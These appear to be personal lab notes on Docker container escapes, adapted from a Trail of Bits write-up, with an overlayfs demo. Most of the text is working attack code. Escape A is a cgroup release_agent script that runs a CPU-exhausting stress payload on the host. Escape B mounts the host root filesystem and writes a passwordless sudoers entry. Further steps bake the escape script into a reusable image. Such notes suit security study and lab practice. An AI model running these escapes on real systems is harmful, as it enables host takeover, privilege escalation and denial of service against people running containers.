# Escape Containers

## Denial of Service Container
Describe how the escape containers were created.

# Derived from https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/


# Review overlay file system
https://wvi.cz/diyC/images-containers/
https://www.kernel.org/doc/html/latest/filesystems/overlayfs.html
https://jvns.ca/blog/2019/11/18/how-containers-work--overlayfs/
$ mkdir upper lower merged work
$ echo "I'm from lower!" > lower/in_lower.txt
$ echo "I'm from upper!" > upper/in_upper.txt
$ # `in_both` is in both directories
$ echo "I'm from lower!" > lower/in_both.txt
$ echo "I'm from upper!" > upper/in_both.txt
$ sudo mount -t overlay overly -o lowerdir=/home/pi/tmp/lower,upperdir=/home/pi/tmp/upper,workdir=/home/pi/tmp/work /home/pi/tmp/merged


#=================================================#
# CONTAINER ESCAPE A
#=================================================#

SYNERGIA: Got mount: /tmp/cgrp: wrong fs type, bad option, bad superblock on cgroup, missing codepage or helper program, or other error.
SOLUTION: https://askubuntu.com/questions/525243/why-do-i-get-wrong-fs-type-bad-option-bad-superblock-error


# On the host
docker run --name ESCAPE_A --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# In the container, create escape.sh file with following

#!/bin/sh
date
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup_memory /tmp/cgrp
mkdir /tmp/cgrp/x
date
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
date
cat stress.txt > /cmd
chmod a+x /cmd
date
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
date

#=================================================#
# CONTAINER ATTACK A
#=================================================#
# In the container, create stress.txt file with following
#!/bin/bash
stress() {
  (
    pids=""
    cpus=${1:-1}
    seconds=${2:-60}
    echo loading $cpus CPUs for $seconds seconds
    trap 'for p in $pids; do kill $p; done' 0
    for ((i=0;i<cpus;i++)); do while : ; do : ; done & pids="$pids $!"; done
    sleep $seconds
  )
}
stress 2 20


#=================================================#
# CONTAINER ESCAPE B
#=================================================#
# Create container from alpine image
FROM alpine
ENV WORKDIR /privesc
RUN mkdir -p $WORKDIR
VOLUME $WORKDIR
WORKDIR $WORKDIR

# Command to build container
docker build -t priv-container .


# Command to run container, was /bin/bash
docker run --name ESCAPE_B -v /:/privesc -it priv-container /bin/sh

# Attack part 1
echo "testuser ALL=(ALL) NOPASSWD: ALL" > /privesc/etc/sudoers.d/010_testuser-nopasswd



#=================================================#
# USEFUL DOCKER COMMANDS TO AUTOMATE ESCAPE
# To install vim in docker, need to be privileged
# docker run --privileged --name=ESCAPE_A --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
# then in container # apt update
#                   # apt install nano (vim hopeless)
# Be sure to add as first line to script
# #!/usr/bin/bash
# Finally create escape.sh and be sure to make executable
#                   # chmod +x escape.sh
#=================================================#
docker commit ESCAPE_A ubuntu_escape

# Using original ubuntu, install nano, add escape.sh, then commit
docker run --privileged --name=ESCAPE_A --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
# From within container
apt-get update
apt-get install nano
nano escape.sh
#!/usr/bin/bash
...
(save)
chmod +x escape.sh

# In another host terminal, saved current ubuntu to ubuntu_escape image
# The ubuntu_escape will have the escape.sh
docker commit ESCAPE_A ubuntu_escape
# You can now exit the ubuntu container


# Start the ubuntu_escape (do not need privileged)
docker run --name=ESCAPE_A --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu_escape bash

# Finally, from other host terminal, execute escape.sh in ubuntu_escape
docker exec -it ESCAPE_A /escape.sh
